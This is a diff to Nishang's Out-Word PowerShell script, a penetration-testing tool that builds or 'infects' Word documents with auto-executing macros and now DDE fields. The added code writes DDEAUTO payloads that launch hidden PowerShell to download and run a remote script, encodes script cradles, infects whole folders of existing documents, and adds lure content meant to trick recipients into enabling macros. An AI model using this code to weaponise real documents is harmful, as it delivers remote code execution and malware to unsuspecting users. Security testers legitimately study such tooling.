@@ -2,13 +2,13 @@ function Out-Word
 {
 <#
 .SYNOPSIS
-Nishang Script which can generate as well as "infect" existing word files with an auto executable macro. 
+Nishang Script which can generate as well as "infect" existing word files with an auto executable macro or DDE. 
 
 .DESCRIPTION
-The script can create as well as "infect" existing word files with an auto executable macro. Powershell payloads
-could be exeucted using the genereated files. If path to a folder is passed to the script it can insert the macro in all existing word
+The script can create as well as "infect" existing word files with an auto executable macro or DDE. Powershell or other payloads
+could be exeucted using the genereated files. If path to a folder is passed to the script it can insert the payload in all existing word
 files in the folder. With the Recurse switch, sub-folders can also be included. 
-For existing files, a new macro enabled doc file is generated from a docx file and for existing .doc files, the macro code is inserted.
+For existing files, a new macro enabled doc file is generated from a docx file and for existing .doc files, the payload is inserted.
 LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the 
 original docx is removed and the data in it is lost.
 
@@ -27,6 +27,9 @@ Note that if the script expects any parameter passed to it, you must pass the pa
 .PARAMETER Arguments
 Arguments to the powershell script to be executed on the target. To be used with PayloadURL parameter.
 
+.PARAMETER DDE
+Switch to use DDE attack vector in place of macros.
+
 .PARAMETER WordFileDir
 The directory which contains MS Word files which are to be "infected".
 
@@ -39,11 +42,11 @@ Recursively look for Word files in the WordFileDir
 .PARAMETER RemoveDocx
 When using the WordFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.
 
-.PARAMETER RemainSafe
-Use this switch to turn on Macro Security on your machine after using Out-Word.
+.PARAMETER RemainUnSafe
+Use this switch to keep Macro Security turned off on your machine after using Out-Word.
 
 .EXAMPLE
-PS > Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process" -RemainSafe
+PS > Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"
 
 Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
 in the current directory.
@@ -97,13 +100,26 @@ The above command would search recursively for .docx files in C:\docfiles, gener
 delete the original files.
 
 .EXAMPLE
-PS > Out-Word -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -RemainSafe
+PS > Out-Word -PayloadURL http://yourwebserver.com/Invoke-PowerShellTcpOneLine.ps1 -DDE
 
-Out-Word turns off Macro Security. Use -RemainSafe to turn it back on.
+Use above for DDE attack instead of macro to download and execute PowerShell script in memory.
+
+.EXAMPLE
+PS > Out-Word -Payload "DDEAUTO C:\\windows\\system32\\cmd.exe ""/k calc.exe""" -DDE
+
+Use above for custom payload with DDE.
+
+.EXAMPLE
+PS > Out-Word -PayloadScript C:\test\cradle.ps1 -DDE
+
+Use above to encode and use a script with DDE attack. Since only 255 characters are supported with 
+the DDE attack, this is mostly useful only for using encoded cradles.
+
 
 
 .LINK
 http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
+https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 https://github.com/samratashok/nishang
 #>
 
@@ -126,27 +142,30 @@ https://github.com/samratashok/nishang
         [Parameter(Position=3, Mandatory = $False)]
         [String]
         $Arguments,
-        
+
         [Parameter(Position=4, Mandatory = $False)]
-        [String]
-        $WordFileDir,
+        [Switch]
+        $DDE,
         
         [Parameter(Position=5, Mandatory = $False)]
         [String]
-        $OutputFile="$pwd\Salary_Details.doc",
-
+        $WordFileDir,
         
         [Parameter(Position=6, Mandatory = $False)]
+        [String]
+        $OutputFile="$pwd\Salary_Details.doc",
+
+        [Parameter(Position=7, Mandatory = $False)]
         [Switch]
         $Recurse,
         
-        [Parameter(Position=7, Mandatory = $False)]
+        [Parameter(Position=8, Mandatory = $False)]
         [Switch]
         $RemoveDocx,
 
-        [Parameter(Position=8, Mandatory = $False)]
+        [Parameter(Position=9, Mandatory = $False)]
         [Switch]
-        $RemainSafe
+        $RemainUnSafe
     )
     
     $Word = New-Object -ComObject Word.Application
@@ -181,6 +200,10 @@ https://github.com/samratashok/nishang
 
     if(!$Payload)
     {
+        #Download-Execute payload for DDE
+        $DDEPayload = "DDEAUTO ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" "" iex(New-Object Net.WebClient).DownloadString('$PayloadURL');$Arguments"""
+
+        #Download-Execure payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }
 
@@ -215,6 +238,15 @@ https://github.com/samratashok/nishang
         #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
         $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
         $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
+
+        #Encoded script payload for DDE - length limit of 255 characters so mostly useful only for encoded cradles
+        $DDEPayload = "DDEAUTO ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" "" -e $EncScript"""
+        if ($DDEPayload.Length -ge 255)
+        {
+            Write-Warning "DDE Attack cannot have payload longer than 255 characters. Exiting..."
+            break
+        }
+        #Encoded script payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
     }
 
@@ -314,11 +346,40 @@ https://github.com/samratashok/nishang
         }
         ForEach ($WordFile in $WordFiles)
         {
+            Write-Verbose "Reading files from $WordFileDir"
             $Word = New-Object -ComObject Word.Application
-            $Word.DisplayAlerts = $False
+            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
+            {
+                $Word.DisplayAlerts = $False
+            }
+            else
+            {
+                $Word.DisplayAlerts = "wdAlertsNone"
+            }
             $Doc = $Word.Documents.Open($WordFile.FullName)
-            $DocModule = $Doc.VBProject.VBComponents.Item(1)
-            $DocModule.CodeModule.AddFromString($code_one)                  
+            #Insert DDE Payload
+            if ($DDE)
+            {
+                Write-Verbose "Using the DDE technique."
+                if(!$DDEPayload)
+                {
+                    $DDEPayload = $Payload
+                    $word.Selection.InsertFormula($Payload)
+                }
+                else
+                {
+                    $word.Selection.InsertFormula($DDEPayload)
+                }
+
+            }
+            #Else use macro
+            else
+            {
+                Write-Verbose "Using auto-executable macro."
+                $DocModule = $Doc.VBProject.VBComponents.Item(1)
+                $DocModule.CodeModule.AddFromString($code_one)
+            }
+                        
             if ($WordFile.Extension -eq ".doc")
             {
                 $Savepath = $WordFile.FullName
@@ -348,19 +409,37 @@ https://github.com/samratashok/nishang
                 Remove-Item -Path $WordFile.FullName
             }
             $Word.quit()
-            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
+            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
         }
     }
     else
     {
         $Doc = $Word.documents.add()
-        $DocModule = $Doc.VBProject.VBComponents.Item(1)
-        $DocModule.CodeModule.AddFromString($code_one)
-        
+        #Insert DDE Payload
+        if ($DDE)
+        {
+            if(!$DDEPayload)
+            {
+                $DDEPayload = $Payload
+                $word.Selection.InsertFormula($Payload)
+            }
+            else
+            {
+                $word.Selection.InsertFormula($DDEPayload)
+            }
+        }
+        #Else use macro
+        else
+        {
+            $DocModule = $Doc.VBProject.VBComponents.Item(1)
+            $DocModule.CodeModule.AddFromString($code_one)
+        }        
         #Add stuff to trick user in Enabling Content (running macros)
         $Selection = $Word.Selection 
         $Selection.TypeParagraph() 
         $Shape = $Doc.Shapes
+
+        #Hardcoded path the jpg right now.
         $MSLogoPath = ".\microsoft-logo.jpg"
         if (Test-Path $MSLogoPath)
         {
@@ -389,10 +468,14 @@ https://github.com/samratashok/nishang
         Write-Output "Saved to file $OutputFile"
         $Doc.Close()
         $Word.quit()
-        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
     }
 
-    if ($RemainSafe -eq $True)
+    if ($RemainUnSafe)
+    {
+        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"   
+    }
+    else
     {
         #Turn on Macro Security
         New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
